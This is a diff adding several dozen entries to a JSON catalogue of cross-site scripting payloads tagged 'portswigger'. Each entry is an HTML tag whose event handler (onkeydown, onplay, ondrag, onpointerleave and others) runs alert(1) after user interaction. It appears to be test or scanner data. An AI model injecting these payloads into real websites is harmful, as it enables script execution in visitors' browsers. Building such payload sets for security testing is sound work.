@@ -14619,6 +14619,438 @@
       "confidence": "high",
       "payload": "<input onselect=alert(1) value=abc>",
       "note": "text selection event"
+    },
+    {
+      "id": "ps-ia-101",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onkeydown=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-102",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onkeyup=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-103",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onkeypress=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-104",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input oninput=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-105",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onbeforeinput=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-106",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onsearch=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-107",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input oncut=alert(1) value=abc>",
+      "note": "keyboard/editing interaction (synthetic KeyboardEvent)"
+    },
+    {
+      "id": "ps-ia-108",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<form onreset=alert(1)><input type=reset></form>",
+      "note": "form reset interaction"
+    },
+    {
+      "id": "ps-ia-109",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onpause=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-110",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onplay=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-111",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onvolumechange=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-112",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onratechange=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-113",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onseeking=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-114",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onseeked=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-115",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onended=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-116",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onwaiting=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-117",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video oncanplay=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-118",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<video onsuspend=alert(1) src=x>",
+      "note": "media state interaction (synthetic Event)"
+    },
+    {
+      "id": "ps-ia-119",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ontoggle=alert(1)>x</div>",
+      "note": "details/dialog toggle interaction"
+    },
+    {
+      "id": "ps-ia-120",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onbeforetoggle=alert(1)>x</div>",
+      "note": "details/dialog toggle interaction"
+    },
+    {
+      "id": "ps-ia-121",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondrag=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-122",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondragend=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-123",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondragleave=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-124",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ontouchend=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-125",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ontouchcancel=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-126",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ongotpointercapture=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-127",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onlostpointercapture=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-128",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onfullscreenchange=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-129",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onscroll=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-130",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onselectstart=alert(1)>x</div>",
+      "note": "long-tail interaction event"
+    },
+    {
+      "id": "ps-ia-201",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onmouseleave=alert(1)>x</div>",
+      "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "ps-ia-202",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onpointerleave=alert(1)>x</div>",
+      "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "ps-ia-203",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onfocusout=alert(1)>x</div>",
+      "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "ps-ia-204",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onselectionchange=alert(1)>x</div>",
+      "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "ps-ia-205",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div oncancel=alert(1)>x</div>",
+      "note": "long-tail interaction event (final dispatchable batch)"
+    },
+    {
+      "id": "ps-ia-206",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onafterprint=alert(1) value=abc>",
+      "note": "long-tail interaction event (final dispatchable batch)"
     }
   ],
   "polyglots": [
